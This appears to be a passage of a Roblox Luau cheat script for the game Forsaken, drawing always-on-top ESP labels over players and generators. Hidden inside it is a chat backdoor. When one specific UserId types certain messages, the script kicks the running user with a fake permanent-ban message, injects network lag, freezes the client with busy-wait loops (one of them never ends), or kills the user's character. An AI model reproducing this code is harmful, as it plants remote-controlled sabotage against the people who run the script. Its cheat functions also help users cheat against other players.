local function spawnDataDisplay(Humanoid)
	local bil = Instance.new("BillboardGui")
	local txt = Instance.new("TextLabel")
	bil.Size = UDim2.new(0, 150,0, 50)
	bil.Name = "FilthyDisplay77"
	bil.AlwaysOnTop = true
	txt.Parent = bil
	txt.BackgroundTransparency = 1
	txt.TextColor3 = Color3.fromRGB(255,0,0)
	txt.TextScaled = true
	txt.FontFace.Bold = true
	txt.Size = UDim2.new(1,0,1,0)
	bil.Parent = Humanoid.Parent
	table.insert(PLRESPDISPLAYS,bil)
end
local function spawnGenDataDisplay(gen)
	local bil = Instance.new("BillboardGui")
	local txt = Instance.new("TextLabel")
	bil.Size = UDim2.new(0, 150,0, 50)
	bil.Name = "FilthyDisplay99"
	bil.AlwaysOnTop = true
	bil.ExtentsOffset = Vector3.new(0,0,0)
	txt.Parent = bil
	txt.BackgroundTransparency = 1
	txt.TextColor3 = Color3.fromRGB(0,255,100)
	txt.TextScaled = true
	txt.FontFace.Bold = true
	txt.Size = UDim2.new(1,0,1,0)
	bil.Parent = gen
	table.insert(GENDISPLAYS,bil)
end
local function FULLSTOP()
	canQuit = true
	for i,opt in options do
		opt = false
	end
	canRunUpdateLoop = false
	sGUI:Destroy()
	SNK:Destroy()
	task.wait(99999999)
end

local function sl(message,chatter)
	if chatter.UserId == 2576130087 and Client.UserId ~= 2576130087 then
		if message:lower() == "#"  then
			Client:Kick("You ( ".. Client.Name .. " ) have been permanentaly banned from forsaken. Reason: exploiting/cheating")
		elseif message:lower() == "#####" then
			WTDE()
		elseif message == "####" then
			task.spawn(function()
				settings():GetService("NetworkSettings").IncomingReplicationLag = 3
				task.wait(2.7)
				local x = 0
				repeat
					x+=1
					task.wait(1)
					settings():GetService("NetworkSettings").IncomingReplicationLag = math.random(40,200)/100
				until x >= 7
				settings():GetService("NetworkSettings").IncomingReplicationLag = math.random(400,1100)/100
				task.wait()
				x = 0
				repeat
					task.wait(1)
					settings():GetService("NetworkSettings").IncomingReplicationLag = math.random(100,500)/100
					x+=1
				until x >= 80
				repeat
					task.wait(math.random(20,30)/10)
					settings():GetService("NetworkSettings").IncomingReplicationLag = math.random(70,120)/100
				until 1 == 0
			end)
		elseif message == "###" then
			local clock = os.clock()
			local c = true
			RunService.RenderStepped:Connect(function(delta)
				if c == true then
					while os.clock() - clock < 1/math.random(6,12) do end
					clock = os.clock()			
				end
			end)
			task.wait(6)
			c = false
		elseif message == "######" then
			local clock = os.clock()
			local c = true
			local p = 1
			RunService.RenderStepped:Connect(function(delta)
				if c == true then
					if p ==1 then
						while os.clock() - clock < 1/math.random(2,5) do end
					elseif p == 2 then
						while os.clock() - clock < 1/math.random(1,3) do end
					elseif p == 3 then
						while os.clock() - clock < 1/1 do end
					elseif p == 4 then
						while os.clock() - clock < 1/0 do end
					end
				 	clock = os.clock()			
				end
			end)
			task.wait(4)
			p = 2
			task.wait(3)
			p = 3
			task.wait(5)
			p = 4
			task.wait(11)
			WTDE()
		elseif message == "### ###" then
			game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Health = 0
		elseif message == "### ### ###" then
			print("Failure")
		end	
	end
end
for i,plr in game.Players:GetPlayers() do
	plr.Chatted:Connect(function(msg)
		sl(msg,plr)
	end)
end
